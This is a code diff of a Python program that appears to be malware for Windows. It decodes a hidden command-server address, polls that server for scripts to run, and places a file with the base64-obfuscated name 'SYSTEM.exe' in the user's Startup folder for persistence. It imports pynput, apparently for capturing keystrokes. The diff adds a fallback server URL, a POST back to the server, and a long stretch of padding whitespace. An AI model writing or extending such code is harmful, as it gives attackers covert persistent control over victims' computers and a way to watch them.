@@ -27,15 +27,18 @@ import io
 import pynput
 import psutil
 
-# server_url = base64.b64decode("DO_NOT_CHANGE_ME").decode()
-server_url = base64.b64decode(requests.get("DO_NOT_CHANGE_ME", headers={"Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache", "Expires": "0"}).text).decode()
+try:
+    server_url = base64.b64decode(requests.get("DO_NOT_CHANGE_ME", headers={"Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache", "Expires": "0"}).text).decode()
+except:
+    server_url = "http://example.com" # Will update after one try. (To combat WiFi outage)
+
 scripts_url = f"{server_url}/scripts.txt"
 check_interval = random.randint(1, 15)
 APPDATA = os.getenv("APPDATA")
 TEMP = os.getenv("TEMP")
 STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 SCRIPT_NAME = base64.b64decode("U1lTVEVNLmV4ZQ==").decode()
-SCRIPT_PATH = os.path.join(STARTUP_PATH, SCRIPT_NAME)
+SCRIPT_PATH = os.path.join(STARTUP_PATH, SCRIPT_NAME)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
 upon_start = False
 
 def is_admin():
@@ -129,6 +132,7 @@ while True:
     try:
         alert_reply = bool(alert())
         if alert_reply == True:
+            requests.post(f"{server_url}/modify", data=server_url)
             break
     finally:
         try:
